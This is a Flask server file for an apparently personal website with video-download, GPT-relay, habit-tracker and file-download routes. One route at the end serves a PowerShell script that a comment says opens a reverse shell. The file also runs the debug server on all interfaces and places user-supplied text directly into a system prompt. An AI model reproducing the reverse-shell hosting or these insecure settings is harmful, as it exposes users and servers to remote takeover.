# basic flask server
from flask import Flask, redirect, request, jsonify, render_template, send_file, Response
import flask

import os
from pytube import YouTube
import openai

import yt_dlp

from habitTracker.HabitTracker import HabitTracker, Individual


app = Flask(__name__)

"""

Endpoints for the main pages

"""

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/downloads')
def dodododo_downloads():
    return render_template("downloads.html")

@app.route('/skycity')
def skycity():
    return render_template("skycity.html")

@app.route('/portfolio')
def portfolio():
    return render_template("portfolio.html")

@app.route('/video_downloader')
def video_downloader():
    return render_template("video-downloader.html")

@app.route('/download_video', methods=["GET"])
def video_downloader_download_video():
    link = request.args.get('url')
    save_path = "./"
    download_filename = "temp.mp4"

    try:
        # Remove previous temp.mp4 if it exists
        if os.path.exists(download_filename):
            os.remove(download_filename)

        ydl_opts = {
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'outtmpl': f'{save_path}/{download_filename}',
            'postprocessors': [{
                'key': 'FFmpegVideoConvertor',
                'preferedformat': 'mp4',
            }],
            'merge_output_format': 'mp4',
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([link])

        # Return the file
        with open(download_filename, 'rb') as file:
            content = file.read()
            response = Response(content, headers={
                "Content-Disposition": f"attachment; filename={download_filename}",
                "Content-Type": "video/mp4"
            })

            return response

    except Exception as e:
        print(f"Download failed: {e}")
        return f"Download failed: {str(e)}", 400
    



@app.route('/github_redirect')
def github_redirect():
    return redirect("https://github.com/Thrasherop")

@app.route('/dodododo_download_all')
def dodododo_download_all():
    return send_file('misc/download_files/ALL-4-worlds.zip', as_attachment=True)



"""

World Download Links

"""
@app.route('/doodododo_download_disasterSMP')
def dodododo_download_disasterSMP():
    return send_file('misc/download_files/disasterSMPDirectory.zip', as_attachment=True)

@app.route('/doodododo_download_season_2-origins')
def dodododo_download_season_2_origins():
    return send_file('misc/download_files/dodododo_season_2-origins-.zip', as_attachment=True)

@app.route('/doodododo_download_skjafdkahesf')
def dodododo_download_skjafdkahesf():
    return send_file('misc/download_files/kjafdkahesfDirectory.zip', as_attachment=True)

@app.route('/doodododo_download_StillNotAmplified')
def dodododo_download_StillNotAmplified():
    return send_file('misc/download_files/StillNotAmplifiedDirectory.zip', as_attachment=True)

"""

Endpoints for scavenger hunt
"""

@app.route('/LoveTap/app-info')
def Lovetap_app_info():
    return send_file('templates/lovetap-general.html')

@app.route('/a')
def scavenger_hunt_first():
    return send_file('templates/scavenger_hunt1.html')

@app.route('/a/extension')
@app.route('/aextension')
@app.route('/extension')
def scavenger_hunt_extansion():
    return send_file("templates/scavenger_hunt_cheeseotruth.html")

@app.route("/a/curiosity")
@app.route("/acuriosity")
@app.route("/curiosity")
def scavanger_hunt_end():
    return send_file("templates/scavenger_hunt_end.html")

"""

   These are the endpoints for the basic Quebec GPT middleman page. 

"""

@app.route('/quebec')
def quebecSplash():
    return render_template("quebecAI.html")


@app.route('/quebecAI', methods=['POST'])
def quebecAI():
    data = request.json
    user_message = data.get('message', '')
    conversation_history = data.get('conversation', '')

    model="gpt-3.5-turbo"
    if "gpt-4" in user_message.lower() or "gpt4" in user_message.lower():
        model="gpt-4"
    

    # Get API key from the file
    with open("secrets/openAIkey.txt") as f:
        openai.api_key = f.read()

    print(f"sending request to openai for model {model}")

    completion = openai.ChatCompletion.create(
    model=model,
    messages=[
        {"role": "system", "content": f"You are a helpful assistant. Your job is to help the user. You will continue an existing conversation. Here is the conversation up to now: {conversation_history}"},
        {"role": "user", "content": f"{user_message}"}
    ]
    )


    ai_message = completion.choices[0].message.content


    processed_message = f"{ai_message}"  # Replace this line with your string processing logic

    return jsonify({'response': processed_message})


"""

Endpoints for Parent's Habit tracker app

"""

@app.route("/habits", methods=['GET'])
def habits():

    # Load habitTracker object (or create if it doesn't exist)
    if os.path.exists("./habitTracker/HabitTrackerObj.pickle"):
        tracker = HabitTracker.loadFromFile()
    else:
        tracker = HabitTracker()


    # If there is data, unpack and process it
    query_params = request.args.to_dict()
    madeChanges = False
    if (len(query_params) > 1):
        print("params_passed")

        # extract parameters (ONLY if there is a habitIndex)
        # If there is no habit index, then it is likely that this request
        # is just retaining user login
        if query_params['habitIndex'] != None:
            habitIndex = int(query_params['habitIndex'])
            individual = query_params['individual']
            operation = query_params['operation']

            # Check if there is a custom value
            customValue = None
            if 'customValue' in query_params:
                customValue = query_params['customValue']

            # Perform operation on HabitTracker
            if operation == "add":
                tracker.addPoints(habitIndex, individual, customValue)
            else:
                tracker.removePoints(habitIndex, individual, customValue)

            # Include madeChanges
            madeChanges = True

    # Save the tracker
    tracker.save()


    # Finally, send the template + fresh data
    fresh_data = {
        "habitData" : tracker.getHabitData(),
        "momScore" : tracker.getIndividualsTotalPoints(Individual.MOM),
        "dadScore" : tracker.getIndividualsTotalPoints(Individual.DAD),
        "totalScore" : tracker.getTotalPoints(),
        "totalScore" : tracker.getTotalPoints(),

        # Track whether changes were made on this request
        "madeChanges" : madeChanges,

        # Specify user if exists
        "user" : query_params['individual'] if 'individual' in query_params != None else None
    }
    return render_template("habitTracker.html", data=fresh_data)


"""

Misc Endpoints

"""

@app.route('/file_download/ps1')
def file_download():
    # p.ps1 provides a reverse shell to fantasy server
    return send_file('misc/misc_files/p.ps1', as_attachment=True)



if __name__ == "__main__":
    app.run(debug=True, port=80, host='0.0.0.0', threaded=True)

